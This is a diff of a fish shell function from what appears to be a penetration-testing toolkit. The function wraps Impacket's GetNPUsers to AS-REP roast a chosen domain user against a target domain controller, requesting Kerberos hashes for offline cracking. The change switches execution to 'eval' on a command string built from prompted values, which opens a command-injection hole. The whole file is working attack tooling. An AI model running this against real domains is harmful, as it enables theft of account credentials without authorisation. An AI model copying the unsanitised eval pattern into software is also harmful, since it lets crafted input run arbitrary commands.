@@ -5,7 +5,7 @@ function __kronos_asrep_roast --description "Run AS-REP Roasting using GetNPUser
         set wizard 1
     end
 
-    argparse h/help u/username= d/domain= k/kerberos q/quiet -- $argv
+    argparse h/help u/username= d/domain= k/kerberos X/edit-cmd q/quiet -- $argv
     or return 1
 
     if set -q _flag_help
@@ -15,8 +15,9 @@ function __kronos_asrep_roast --description "Run AS-REP Roasting using GetNPUser
         echo ""
         echo "Options:"
         echo "  -u, --username USER Provide username (falls back to \$TGT_CRED_USERNAME)"
-        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_DC_DOMAIN)"
+        echo "  -d, --domain DOMAIN Target domain name (falls back to \$TGT_DC_DOMAIN)"
         echo "  -k, --kerberos      Use Kerberos authentication"
+        echo "  -X, --edit-cmd      Inspect and edit the command before execution"
         echo "  -q, --quiet         Skip prompts and use cached/default values"
         echo "  -h, --help          Show this help message"
         return 0
@@ -27,28 +28,30 @@ function __kronos_asrep_roast --description "Run AS-REP Roasting using GetNPUser
     set -l user $_flag_username
 
     if not set -q _flag_quiet
-        set_color cyan; echo "[*] Starting AS-REP Roast wizard..."; set_color normal
+        if test "$wizard" -eq 1 -o -n "$target"
+            set_color cyan; echo "[*] Starting AS-REP Roast wizard..."; set_color normal
 
-        set -l def_target "$__KRONOS_CACHE_ASREP_TARGET"
-        if test -z "$def_target"; set def_target "$TGT_DC_IP"; end
-        if test -z "$def_target"; set def_target "$TGT_DC"; end
-        if test -z "$def_target"; set def_target "$TGT"; end
-        if test -n "$target"; set def_target "$target"; end
-        set target (__kronos_ask "Target DC IP/Hostname" "$def_target"); or return 1
-        set -U __KRONOS_CACHE_ASREP_TARGET "$target"
+            set -l def_target "$__KRONOS_CACHE_ASREP_TARGET"
+            if test -z "$def_target"; set def_target "$TGT_DC_IP"; end
+            if test -z "$def_target"; set def_target "$TGT_DC"; end
+            if test -z "$def_target"; set def_target "$TGT"; end
+            if test -n "$target"; set def_target "$target"; end
+            set target (__kronos_ask "Target DC IP/Hostname" "$def_target"); or return 1
+            set -U __KRONOS_CACHE_ASREP_TARGET "$target"
 
-        set -l def_domain "$__KRONOS_CACHE_ASREP_DOMAIN"
-        if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
-        if test -n "$domain"; set def_domain "$domain"; end
-        set domain (__kronos_ask "Domain Name" "$def_domain"); or return 1
-        set -U __KRONOS_CACHE_ASREP_DOMAIN "$domain"
+            set -l def_domain "$__KRONOS_CACHE_ASREP_DOMAIN"
+            if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
+            if test -n "$domain"; set def_domain "$domain"; end
+            set domain (__kronos_ask "Domain Name" "$def_domain"); or return 1
+            set -U __KRONOS_CACHE_ASREP_DOMAIN "$domain"
 
-        set -l def_user "$__KRONOS_CACHE_ASREP_USER"
-        if test -z "$def_user"; set def_user "$TGT_USERNAME"; end
-        if test -z "$def_user"; set def_user "$TGT_CRED_USERNAME"; end
-        if test -n "$user"; set def_user "$user"; end
-        set user (__kronos_ask "User to Roast" "$def_user"); or return 1
-        set -U __KRONOS_CACHE_ASREP_USER "$user"
+            set -l def_user "$__KRONOS_CACHE_ASREP_USER"
+            if test -z "$def_user"; set def_user "$TGT_USERNAME"; end
+            if test -z "$def_user"; set def_user "$TGT_CRED_USERNAME"; end
+            if test -n "$user"; set def_user "$user"; end
+            set user (__kronos_ask "User to Roast" "$def_user"); or return 1
+            set -U __KRONOS_CACHE_ASREP_USER "$user"
+        end
     else
         # Quiet mode fallbacks
         if test -z "$target"; set target "$__KRONOS_CACHE_ASREP_TARGET"; end
@@ -74,16 +77,18 @@ function __kronos_asrep_roast --description "Run AS-REP Roasting using GetNPUser
     else if command -v impacket-GetNPUsers >/dev/null
         set impacket_cmd impacket-GetNPUsers
     else
-        echo "error: GetNPUsers not found. run 'kronos install'." >&2
-        return 1
+        echo "error: GetNPUsers not found. run 'kronos install'."; return 1; end
+
+    set -l roast_cmd "$impacket_cmd \"$domain/$user\" -dc-ip \"$target\" -no-pass -request"
+    if set -q _flag_kerberos
+        set roast_cmd "$roast_cmd -k"
     end
 
-    set -l roast_args "$domain/$user" -dc-ip "$target" -no-pass -request
-    if set -q _flag_kerberos
-        set -a roast_args -k
+    if set -q _flag_edit_cmd
+        set roast_cmd (__kronos_edit_cmd "$roast_cmd"); or return 1
     end
 
     __kronos_check_dep $impacket_cmd; or return 1
     echo "[*] Running $impacket_cmd against $target for user $user@$domain..."
-    command $impacket_cmd $roast_args
+    eval $roast_cmd
 end
